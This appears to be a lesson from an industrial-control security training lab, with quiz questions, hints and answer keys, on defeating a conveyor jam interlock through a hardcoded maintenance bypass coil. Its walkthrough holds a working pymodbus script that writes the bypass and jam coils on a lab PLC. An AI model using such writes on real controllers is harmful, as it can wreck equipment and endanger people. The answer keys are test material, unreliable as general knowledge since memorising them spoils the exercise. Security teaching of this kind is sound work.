---
title: Trigger the bypass
questions:
  - ref: consequence
    prompt: >-
      With MAINT_BYPASS set, what physically happens when a bottle jams on the
      running conveyor?
    kind: choice
    options:
      - The line stops safely as designed
      - The conveyor keeps driving bottles into the jam, causing a pileup and breakage
      - The PLC reboots
      - Nothing, the bypass only affects logging
    correct: 1
    points: 15
    explain: >-
      The interlock exists to stop the conveyor the instant a jam is sensed.
      Defeat it and the conveyor keeps feeding the jam - glass breaks, product is
      lost, and on a real line the mechanical damage and cleanup are expensive
      and hazardous. The bypass converts a self-protecting machine into a
      self-harming one.
  - ref: trigger-flag
    prompt: >-
      Set the bypass coil, then trip the jam sensor on the live PLC. When the
      conveyor keeps running through an active jam, the runtime emits a witness
      flag into holding registers 50-65. Recover and submit it.
    kind: dynamic
    flag_prefix: OTF
    points: 30
    hints:
      - body: >-
          Write coil 9 TRUE (MAINT_BYPASS). Then assert the jam input - the jam
          sensor is mapped to a coil/discrete you can also set for testing.
          Watch the conveyor-run register stay TRUE despite the jam.
        cost: 8
      - body: >-
          Read holding registers 50..66 once the run-through condition holds.
          Decode ASCII, two bytes per register, big-endian.
        cost: 12
    explain: >-
      The witness flag only appears when the live logic genuinely runs the
      conveyor while a jam is asserted - proving you reproduced the defeated
      interlock, not just read about it. Each session's flag is unique.
  - ref: remediation
    prompt: >-
      What is the correct remediation for a hardcoded maintenance bypass like
      this in production PLC logic?
    kind: choice
    options:
      - Leave it but change the coil address so it is harder to find
      - Remove the bypass term entirely; gate maintenance behaviour behind a physical key switch and a supervised procedure
      - Trust that no attacker will read the program
      - Add a comment warning not to use it
    correct: 1
    points: 15
    explain: >-
      Security by obscurity (moving or hiding the coil) fails the moment someone
      reads the program, which you just did. The bypass must be removed from
      normal logic. Where a maintenance override is genuinely needed, it belongs
      behind a physical key switch wired to a real input and a supervised
      procedure - not a network-writable coil that anyone on the segment can set.
---

You have found the back door in the code. Now prove it is real by reproducing it
on the running controller - carefully, because the point of this room is to
understand the consequence, not to flail at the runtime.

## Set the bypass and trip the jam

```bash
python3 - <<'PY'
from pymodbus.client import ModbusTcpClient
import time, struct
c = ModbusTcpClient('plc.lab', port=502); c.connect()

c.write_coil(address=9, value=True)        # MAINT_BYPASS := TRUE
# assert the jam input the way the maintenance test harness would
c.write_coil(address=8, value=True)        # (confirm the jam-sensor mapping from program.st)

time.sleep(2)
regs = c.read_holding_registers(address=50, count=16).registers
print('witness:', b''.join(struct.pack('>H', r) for r in regs))
c.close()
PY
```

When the conveyor-run output stays TRUE while the jam input is asserted, the
runtime recognises that the interlock has been defeated on live equipment and
releases the witness flag.

## Why this room matters

Every other room so far has exploited a protocol. This one exploited a *program* -
and that is where a very large share of real OT findings actually live. Protocol
weaknesses are structural and mostly unfixable; logic weaknesses are introduced
by people, one well-meaning shortcut at a time, and they are found by reading
code, not sending packets. A maintenance bypass left in production, a debug flag
mapped to a network-writable point, an interlock that can be ORed out from the
outside - these are the findings that fill real PLC code-review reports. Learning
to read ladder and Structured Text is what lets you find them.
